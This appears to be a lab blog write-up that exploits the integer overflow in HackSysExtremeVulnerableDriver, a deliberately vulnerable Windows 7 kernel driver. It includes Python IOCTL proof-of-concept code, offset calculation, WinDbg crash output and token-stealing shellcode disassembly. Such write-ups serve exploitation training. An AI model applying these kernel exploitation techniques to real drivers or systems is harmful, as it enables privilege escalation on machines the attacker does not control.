---
layout:     post
title:      HackSysExtremeVulnerableDriver IntegerOverflow
author:     wooy0ung
tags:       hevd
category:   exploit
---

- 目录
{:toc #markdown-toc}

>[Analysis Environment]  
>guest machine: Windows 7 x86 sp0  
>host machine: Windows 10  
>necessary tools: VirtualKD[[here]](http://virtualkd.sysprogs.org/)、OSRloader[[here]](https://www.osronline.com/article.cfm?article=157)、HackSysExtremeVulnerableDriver[[here]](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)、Windbg  
<!-- more -->


## 0x001 Test POC

First, I send en expected values, so we can make sure we are able to call the TriggerIntegerOverflow method.
```
import sys
from ctypes import *

kernel32 = windll.kernel32
psapi = windll.Psapi
ntdll = windll.ntdll

hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

if not hevDevice or hevDevice == -1:
   print "[-] Couldn't get Device Driver handle."
   sys.exit(0)

buf = "A"*0x100 + "\xb0\xb0\xd0\xba"

kernel32.DeviceIoControl(hevDevice, 0x222027, buf, len(buf), None, 0, byref(c_ulong()), None)
```

Well, it work fine.
```
****** HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW ******
[+] UserBuffer: 0x0131F394
[+] UserBuffer Size: 0x104
[+] KernelBuffer: 0x8D9333AC
[+] KernelBuffer Size: 0x800
[+] Triggering Integer Overflow
Breakpoint 0 hit
HEVD!TriggerIntegerOverflow+0xfc:
8f0f2ad0 8b45e4          mov     eax,dword ptr [ebp-1Ch]
kd> dps esp
8d93339c  02993fc2
8d9333a0  872edb70
8d9333a4  872edbe0
8d9333a8  8f0f3c38 HEVD! ?? ::NNGAKEGL::`string'
8d9333ac  41414141
8d9333b0  41414141
8d9333b4  41414141
8d9333b8  41414141
8d9333bc  41414141
8d9333c0  41414141
8d9333c4  41414141
8d9333c8  41414141
8d9333cc  41414141
···
```

generate enough strings
```
λ python pattern.py create 0x900
```

save this code，rename to poc.py
```
import sys
from ctypes import *

kernel32 = windll.kernel32
psapi = windll.Psapi
ntdll = windll.ntdll

hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

if not hevDevice or hevDevice == -1:
   print "[-] Couldn't get Device Driver handle."
   sys.exit(0)

#buf = "A"*0x100 + "\xb0\xb0\xd0\xba"
buf = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7" + "\xb0\xb0\xd0\xba"
buflen = 0xffffffff

kernel32.DeviceIoControl(hevDevice, 0x222027, buf, buflen, None, 0, byref(c_ulong()), None)
```

execute it, the system will crash, becase retAddr is overwrote with a wrong Addr(0x31724330)
```
kd> k
 # ChildEBP RetAddr  
00 83f5abc4 83f13e71 nt!RtlpBreakWithStatusInstruction
01 83f5ac14 83f1496d nt!KiBugCheckDebugBreak+0x1c
02 83f5afdc 83e7c60c nt!KeBugCheck2+0x68b
03 83f5afdc 83ebc7e8 nt!KiTrap08+0x75
04 9276c02c 83e7d5f8 nt!MmAccessFault+0xb
05 9276c02c 31724330 nt!KiTrap0E+0xdc
WARNING: Frame IP not in any known module. Following frames may be wrong.
06 9276c0b4 83e9f822 0x31724330
07 9276c0d8 83e9f7f4 nt!ExecuteHandler2+0x26
08 9276c190 83ef4342 nt!ExecuteHandler+0x24
09 9276c5a4 83e7b016 nt!KiDispatchException+0x17c
0a 9276c60c 83e7afca nt!CommonDispatchException+0x4a
0b 9276c684 83e9f822 nt!KiExceptionExit+0x192
0c 9276c6a8 83e9f7f4 nt!ExecuteHandler2+0x26
```

calculate the distance between buffer and retAddr
```
λ python pattern.py offset 0x31724330
0x818
```
But, the correct len should be 0x828

Why? 
![](/assets/img/exploit/2018-08-06-hacksys-extreme-vulnerable-driver-integeroverflow/0x001.png)


## 0x002 Exploit it!

Look at TriggerIntegerOverflow method, now, there a buffer size which is between 0xfffffffc and 0xffffffff,  when we call the method, it will add 4 to the integer causing a overflow and bypass the size check.
![](/assets/img/exploit/2018-08-06-hacksys-extreme-vulnerable-driver-integeroverflow/0x002.png)

Just like the challenge of StackOverflow, we may overwrite the retAddr with shellcode Addr
```
kd> dps ebp
832f3bd0  41414141
832f3bd4  00710000
832f3bd8  01c430a0
832f3bdc  ffffffff
832f3be0  832f3bfc
832f3be4  906ac243 HEVD!IrpDeviceIoCtlHandler+0x1b5 [c:\hacksysextremevulnerabledriver\driver\hacksysextremevulnerabledriver.c @ 275]
832f3be8  8785de68
832f3bec  8785ded8
832f3bf0  858b2ec8
832f3bf4  859dcf08
···
kd> u 00710000
00710000 60              pushad
00710001 31c0            xor     eax,eax
00710003 648b8024010000  mov     eax,dword ptr fs:[eax+124h]
0071000a 8b8050010000    mov     eax,dword ptr [eax+150h]
00710010 89c1            mov     ecx,eax
00710012 ba04000000      mov     edx,4
00710017 8b80b8000000    mov     eax,dword ptr [eax+0B8h]
0071001d 2db8000000      sub     eax,0B8h
```

pwn~
![](/assets/img/exploit/2018-08-06-hacksys-extreme-vulnerable-driver-integeroverflow/0x003.png)